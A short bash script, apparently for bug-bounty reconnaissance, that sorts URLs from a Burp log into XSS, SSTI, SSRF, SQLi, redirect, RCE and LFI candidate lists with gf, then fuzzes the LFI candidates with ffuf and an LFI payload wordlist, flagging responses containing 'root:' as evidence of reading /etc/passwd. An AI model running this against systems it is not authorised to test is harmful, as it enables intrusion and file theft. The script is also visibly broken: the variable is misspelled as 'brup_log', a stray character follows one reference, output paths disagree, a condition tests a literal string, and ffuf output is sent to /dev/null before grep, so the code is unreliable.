#!/bin/bash

tools=~/tools
domain=$1
burp_log=$2
AGENT="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
lfi_wordlist="~/payload/lfi_payload_list.txt"

if [[ ! -d "gf/brup_log" ]]; then
		mkdir gf/brup_log
	fi
if [[ -f "${brup_log}" ]]; then
	gf xss ${brup_log}t | anew -q gf/brup_log/${domain}_xss.txt
	gf ssti ${brup_log} | anew -q gf/brup_log/${domain}_ssti.txt
	gf ssrf ${brup_log} | anew -q gf/brup_log/${domain}_ssrf.txt
	gf sqli ${brup_log} | anew -q gf/brup_log/${domain}_sqli.txt
	gf redirect ${brup_log} | anew -q gf/brup_log/${domain}_redirect.txt && cat gf/brup_log/${domain}_ssrf.txt | anew -q gf/brup_log/${domain}_redirect.txt
	gf rce ${brup_log} | anew -q gf/brup_log/${domain}_rce.txt
	gf potential ${brup_log} | cut -d ':' -f3-5 |anew -q gf/brup_log/${domain}_potential.txt
	cat ${brup_log} | unfurl -u format %s://%d%p | anew -q gf/brup_log/${domain}_endpoints.txt
	gf lfi ${brup_log} | anew -q gf/b/${domain}_lfi.txt
fi
if [[ -n "burp_log" ]]; then
	cat gf/burp_log/${domain}_lfi.txt | qsreplace FUZZ | anew -q .tmp/tmp_lfi.txt
	for url in $(cat .tmp/tmp_lfi.txt); do
		ffuf -v -mc 200 -H "${AGENT}" -w $lfi_wordlist -u $url -mr "root:" &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q ${domain}_lfi.txt
	done
fi